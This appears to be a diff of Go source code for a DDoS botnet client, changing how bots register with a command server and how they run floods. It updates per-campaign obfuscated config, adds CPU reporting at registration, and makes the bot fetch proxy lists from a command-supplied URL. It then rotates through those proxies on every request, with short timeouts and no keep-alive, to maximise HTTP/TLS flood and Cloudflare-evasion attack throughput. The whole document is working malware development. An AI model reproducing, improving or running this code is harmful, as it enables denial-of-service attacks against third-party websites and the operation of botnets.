@@ -36,8 +36,8 @@ import (
 var debugMode = true
 
 // Obfuscated config - multi-layer encoding (setup.py generates this)
-const gothTits = "Cr9d3wfOzl53zXSF4KkKxFe2n3Z5sQua3Em+q+Y=" //change me run setup.py
-const cryptSeed = "f3bd5974"                                //change me run setup.py
+const gothTits = "2dUUfTIv6SVrRFXvFxEZ627QEb5UHQpG6rAT+X8=" //change me run setup.py
+const cryptSeed = "457967ad"                                //change me run setup.py
 
 // DNS servers for TXT record lookups (shuffled for load balancing)
 var lizardSquad = []string{
@@ -493,8 +493,8 @@ func dialga() string {
 }
 
 const (
-	magicCode       = "WOnSk$sTaUlG*4FS" //change this per campaign
-	protocolVersion = "v2.2.2"             //change this per campaign
+	magicCode       = "z!RDnjvvXHWDX^sq" //change this per campaign
+	protocolVersion = "proto59"          //change this per campaign
 )
 
 var (
@@ -904,6 +904,12 @@ func revilMem() int64 {
 	return int64(uint64(info.Totalram) * uint64(info.Unit) / 1024 / 1024)
 }
 
+// revilCPU retrieves total CPU cores using runtime.
+// Returns: Number of CPU cores available to the system
+func revilCPU() int {
+	return runtime.NumCPU()
+}
+
 // ============================================================================
 // SHELL EXECUTION FUNCTIONS
 // ============================================================================
@@ -1223,24 +1229,27 @@ func blackEnergy(conn net.Conn, command string) error {
 		pikachu()
 		return nil
 	case "!udpflood", "!tcpflood", "!http", "!ack", "!gre", "!syn", "!dns", "!https", "!tls", "!cfbypass":
-		// Check for proxy mode: !method target port duration -pl proxy1,proxy2,...
+		// Check for proxy mode: !method target port duration -pu <proxy_url>
 		useProxy := false
+		proxyURL := ""
 		minFields := 4
 
-		// Check if -pl flag is present (pre-validated proxy list from CNC)
+		// Check if -pu flag is present (proxy URL - bot fetches and rotates without validation)
 		if (cmd == "!http" || cmd == "!https" || cmd == "!tls" || cmd == "!cfbypass") && len(fields) >= 6 {
-			if fields[4] == "-pl" {
-				useProxy = true
-				// Parse comma-separated proxy list
-				proxies := strings.Split(fields[5], ",")
-				if len(proxies) == 0 {
-					conn.Write([]byte("ERROR: Empty proxy list received\n"))
+			if fields[4] == "-pu" {
+				proxyURL = fields[5]
+				// Fetch proxy list from URL (no validation, max speed)
+				proxies, err := fetchProxyList(proxyURL)
+				if err != nil || len(proxies) == 0 {
+					conn.Write([]byte(fmt.Sprintf("ERROR: Failed to fetch proxies: %v\n", err)))
 					return nil
 				}
-				// Update global proxy list with pre-validated proxies
+				useProxy = true
+				// Update global proxy list
 				proxyListMutex.Lock()
 				proxyList = proxies
 				proxyListMutex.Unlock()
+				deoxys("Loaded %d proxies from %s (no validation)", len(proxies), proxyURL)
 			}
 		}
 
@@ -1357,8 +1366,9 @@ func anonymousSudan(conn net.Conn) {
 	botID := mustangPanda()
 	arch := charmingKitten()
 	ram := revilMem()
-	deoxys("anonymousSudan: Registering - BotID: %s, Arch: %s, RAM: %d MB", botID, arch, ram)
-	conn.Write([]byte(fmt.Sprintf("REGISTER:%s:%s:%s:%d\n", protocolVersion, botID, arch, ram)))
+	cpu := revilCPU()
+	deoxys("anonymousSudan: Registering - BotID: %s, Arch: %s, RAM: %d MB, CPU: %d cores", botID, arch, ram, cpu)
+	conn.Write([]byte(fmt.Sprintf("REGISTER:%s:%s:%s:%d:%d\n", protocolVersion, botID, arch, ram, cpu)))
 	deoxys("anonymousSudan: Entering command loop...")
 	for {
 		conn.SetReadDeadline(time.Now().Add(180 * time.Second))
@@ -1442,26 +1452,62 @@ func main() {
 // ============================================================================
 // PROXY SUPPORT FUNCTIONS
 // These enable L7 attacks through HTTP/HTTPS proxies for IP rotation.
-// Proxy lists are pre-validated by CNC and sent directly to bots.
+// Bot fetches proxy list directly and rotates without validation for max RPS.
 // ============================================================================
 
-// persian returns a random proxy from the global proxy list.
-// Thread-safe using RWMutex for concurrent access during attacks.
-// Returns: Random proxy URL string, or empty string if no proxies loaded
+// proxyIndex tracks current position for round-robin proxy rotation
+var proxyIndex int32
+
+// fetchProxyList downloads and parses a proxy list from a URL.
+// No validation - just fetch and use for maximum speed.
+// Supports formats: ip:port, http://ip:port, https://ip:port
+func fetchProxyList(proxyURL string) ([]string, error) {
+	client := &http.Client{Timeout: 10 * time.Second}
+	resp, err := client.Get(proxyURL)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("status: %d", resp.StatusCode)
+	}
+
+	var proxies []string
+	scanner := bufio.NewScanner(resp.Body)
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
+		if line == "" || strings.HasPrefix(line, "#") {
+			continue
+		}
+		// Ensure http:// prefix
+		if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
+			line = "http://" + line
+		}
+		proxies = append(proxies, line)
+	}
+	return proxies, scanner.Err()
+}
+
+// persian returns the next proxy using round-robin rotation.
+// Uses atomic increment for thread-safe rotation without lock contention.
+// Returns: Next proxy URL string, or empty string if no proxies loaded
 func persian() string {
 	proxyListMutex.RLock()
 	defer proxyListMutex.RUnlock()
 	if len(proxyList) == 0 {
 		return ""
 	}
-	return proxyList[rand.Intn(len(proxyList))]
+	// Round-robin rotation for even distribution across all proxies
+	idx := atomic.AddInt32(&proxyIndex, 1)
+	return proxyList[int(idx)%len(proxyList)]
 }
 
 // meowstic creates an HTTP client configured to use a proxy.
-// Supports HTTP/HTTPS proxies with optional authentication.
+// Uses very short timeout to avoid getting stuck on bad proxies.
 // Parameters:
 //   - proxyAddr: Proxy URL (http://ip:port or http://user:pass@ip:port)
-//   - timeout: Request timeout duration
+//   - timeout: Request timeout duration (ignored, uses 2s for max speed)
 //
 // Returns: Configured HTTP client or error
 func meowstic(proxyAddr string, timeout time.Duration) (*http.Client, error) {
@@ -1470,23 +1516,31 @@ func meowstic(proxyAddr string, timeout time.Duration) (*http.Client, error) {
 		return nil, err
 	}
 
+	// Very short timeouts to skip bad proxies fast and maximize RPS
+	shortTimeout := 2 * time.Second
+
 	transport := &http.Transport{
 		Proxy: http.ProxyURL(proxyURL),
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify: true,
 			MinVersion:         tls.VersionTLS12,
 		},
-		DisableKeepAlives:     false,
-		MaxIdleConns:          100,
-		IdleConnTimeout:       90 * time.Second,
-		ResponseHeaderTimeout: timeout,
+		DisableKeepAlives:     true, // Don't reuse connections with proxies
+		MaxIdleConns:          0,
+		IdleConnTimeout:       1 * time.Second,
+		ResponseHeaderTimeout: shortTimeout,
+		DialContext: (&net.Dialer{
+			Timeout:   shortTimeout,
+			KeepAlive: 0,
+		}).DialContext,
+		TLSHandshakeTimeout: shortTimeout,
 	}
 
 	return &http.Client{
 		Transport: transport,
-		Timeout:   timeout,
+		Timeout:   shortTimeout,
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			if len(via) >= 10 {
+			if len(via) >= 3 {
 				return fmt.Errorf("too many redirects")
 			}
 			return nil
@@ -1772,21 +1826,6 @@ func alakazamProxy(target string, targetPort, duration int, useProxy bool) {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			var client *http.Client
-			if useProxy {
-				proxyAddr := persian()
-				if proxyAddr != "" {
-					var err error
-					client, err = meowstic(proxyAddr, 10*time.Second)
-					if err != nil {
-						client = &http.Client{Timeout: 10 * time.Second}
-					}
-				} else {
-					client = &http.Client{Timeout: 10 * time.Second}
-				}
-			} else {
-				client = sharedClient
-			}
 			for {
 				select {
 				case <-ctx.Done():
@@ -1794,15 +1833,21 @@ func alakazamProxy(target string, targetPort, duration int, useProxy bool) {
 				case <-stopCh:
 					return
 				default:
-					// Rotate proxy periodically in proxy mode
-					if useProxy && rand.Intn(100) < 10 {
+					var client *http.Client
+					if useProxy {
+						// Get next proxy in rotation (round-robin)
 						proxyAddr := persian()
 						if proxyAddr != "" {
-							newClient, err := meowstic(proxyAddr, 10*time.Second)
-							if err == nil {
-								client = newClient
+							var err error
+							client, err = meowstic(proxyAddr, 2*time.Second)
+							if err != nil {
+								continue // Skip to next iteration, try another proxy
 							}
+						} else {
+							continue // No proxies available
 						}
+					} else {
+						client = sharedClient
 					}
 					body := make([]byte, 1024)
 					req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
@@ -1868,18 +1913,6 @@ func machampProxy(target string, targetPort, duration int, useProxy bool) {
 			wg.Add(1)
 			go func() {
 				defer wg.Done()
-				var client *http.Client
-				proxyAddr := persian()
-				if proxyAddr != "" {
-					var err error
-					client, err = meowstic(proxyAddr, 30*time.Second)
-					if err != nil {
-						return
-					}
-				} else {
-					return // No proxy available, skip this worker
-				}
-
 				for {
 					select {
 					case <-ctx.Done():
@@ -1887,15 +1920,14 @@ func machampProxy(target string, targetPort, duration int, useProxy bool) {
 					case <-stopCh:
 						return
 					default:
-						// Rotate proxy periodically
-						if rand.Intn(100) < 10 {
-							proxyAddr := persian()
-							if proxyAddr != "" {
-								newClient, err := meowstic(proxyAddr, 30*time.Second)
-								if err == nil {
-									client = newClient
-								}
-							}
+						// Get next proxy in rotation (round-robin) for every request
+						proxyAddr := persian()
+						if proxyAddr == "" {
+							continue // No proxies available
+						}
+						client, err := meowstic(proxyAddr, 2*time.Second)
+						if err != nil {
+							continue // Skip bad proxy, try next
 						}
 
 						method := methods[rand.Intn(len(methods))]
@@ -1904,7 +1936,6 @@ func machampProxy(target string, targetPort, duration int, useProxy bool) {
 						reqURL := fmt.Sprintf("%s%s", targetURL, path)
 
 						var req *http.Request
-						var err error
 						if method == "POST" {
 							body := turla(rand.Intn(1024) + 256)
 							req, err = http.NewRequest(method, reqURL, strings.NewReader(body))
@@ -1918,9 +1949,9 @@ func machampProxy(target string, targetPort, duration int, useProxy bool) {
 						req.Header.Set("Host", hostname)
 						req.Header.Set("User-Agent", ua)
 						req.Header.Set("Accept", "text/html,application/xhtml+xml")
-						req.Header.Set("Connection", "keep-alive")
+						req.Header.Set("Connection", "close")
 
-						resp, err := client.Do(req)
+						resp, _ := client.Do(req)
 						if resp != nil {
 							io.Copy(io.Discard, resp.Body)
 							resp.Body.Close()
@@ -2075,6 +2106,46 @@ func zoruaWithProxy(proxyAddr string) *ditto {
 	}
 }
 
+// zoruaWithProxyFast creates a browser session with very short timeouts for max RPS.
+// No connection reuse, no keep-alive - just fire and forget for maximum throughput.
+// Parameters:
+//   - proxyAddr: Proxy URL (http://ip:port or with auth)
+//
+// Returns: Configured ditto session with fast proxy support
+func zoruaWithProxyFast(proxyAddr string) *ditto {
+	proxyURL, err := url.Parse(proxyAddr)
+	if err != nil {
+		return zorua() // Fallback to non-proxy version
+	}
+	shortTimeout := 2 * time.Second
+	return &ditto{
+		cookies:   nil,
+		userAgent: eevee[rand.Intn(len(eevee))],
+		client: &http.Client{
+			Timeout: shortTimeout,
+			Transport: &http.Transport{
+				Proxy:             http.ProxyURL(proxyURL),
+				TLSClientConfig:   &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
+				DisableKeepAlives: true, // Don't reuse connections
+				MaxIdleConns:      0,
+				IdleConnTimeout:   1 * time.Second,
+				DialContext: (&net.Dialer{
+					Timeout:   shortTimeout,
+					KeepAlive: 0,
+				}).DialContext,
+				TLSHandshakeTimeout:   shortTimeout,
+				ResponseHeaderTimeout: shortTimeout,
+			},
+			CheckRedirect: func(req *http.Request, via []*http.Request) error {
+				if len(via) >= 3 {
+					return fmt.Errorf("too many redirects")
+				}
+				return nil
+			},
+		},
+	}
+}
+
 // zoroark creates a new cookie jar for session management.
 // Returns: Thread-safe cookie jar implementation
 func zoroark() (http.CookieJar, error) {
@@ -2164,7 +2235,6 @@ func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
 	var requestCount int64
-	var bypassCount int64
 	var wg sync.WaitGroup
 	hostname := target
 	hostname = strings.TrimPrefix(hostname, "https://")
@@ -2176,7 +2246,7 @@ func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {
 	if targetPort == 80 {
 		scheme = "http"
 	}
-	targetURL := fmt.Sprintf("%s://%s:%d/", scheme, hostname, targetPort)
+	_ = fmt.Sprintf("%s://%s:%d/", scheme, hostname, targetPort) // targetURL kept for reference
 	paths := []string{"/", "/index.php", "/wp-login.php", "/admin", "/api/v1/", "/search?q=" + turla(8), "/cdn-cgi/trace"}
 	sessionWorkers := 50
 	if cozyBear < sessionWorkers {
@@ -2186,20 +2256,6 @@ func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			var session *ditto
-			if useProxy {
-				proxyAddr := persian()
-				if proxyAddr != "" {
-					session = zoruaWithProxy(proxyAddr)
-				} else {
-					session = zorua()
-				}
-			} else {
-				session = zorua()
-			}
-			if session.gastly(targetURL) == nil {
-				atomic.AddInt64(&bypassCount, 1)
-			}
 			for {
 				select {
 				case <-ctx.Done():
@@ -2207,14 +2263,19 @@ func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {
 				case <-stopCh:
 					return
 				default:
-					// Rotate proxy periodically in proxy mode
-					if useProxy && rand.Intn(100) < 5 {
+					var session *ditto
+					if useProxy {
+						// Get next proxy in rotation for every session
 						proxyAddr := persian()
-						if proxyAddr != "" {
-							session = zoruaWithProxy(proxyAddr)
-							session.gastly(targetURL) // Re-bypass with new proxy
+						if proxyAddr == "" {
+							continue // No proxies available
 						}
+						session = zoruaWithProxyFast(proxyAddr)
+					} else {
+						session = zorua()
 					}
+
+					// Skip bypass attempt - just flood directly for max RPS
 					path := paths[rand.Intn(len(paths))]
 					reqURL := fmt.Sprintf("%s://%s:%d%s", scheme, hostname, targetPort, path)
 					req, err := http.NewRequest("GET", reqURL, nil)
@@ -2223,25 +2284,14 @@ func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {
 					}
 					req.Header.Set("User-Agent", session.userAgent)
 					req.Header.Set("Accept", "text/html,application/xhtml+xml")
-					req.Header.Set("Connection", "keep-alive")
-					for _, c := range session.cookies {
-						req.AddCookie(c)
-					}
+					req.Header.Set("Connection", "close")
 					req.AddCookie(&http.Cookie{Name: "__cf_bm", Value: turla(32)})
-					resp, err := session.client.Do(req)
-					if err != nil {
-						continue
+					resp, _ := session.client.Do(req)
+					if resp != nil {
+						io.Copy(io.Discard, resp.Body)
+						resp.Body.Close()
 					}
-					if len(resp.Cookies()) > 0 {
-						session.cookies = append(session.cookies, resp.Cookies()...)
-					}
-					io.Copy(io.Discard, resp.Body)
-					resp.Body.Close()
 					atomic.AddInt64(&requestCount, 1)
-					if resp.StatusCode == 503 || resp.StatusCode == 403 {
-						time.Sleep(time.Duration(rand.Intn(3)+2) * time.Second)
-						session.gastly(targetURL)
-					}
 				}
 			}
 		}()
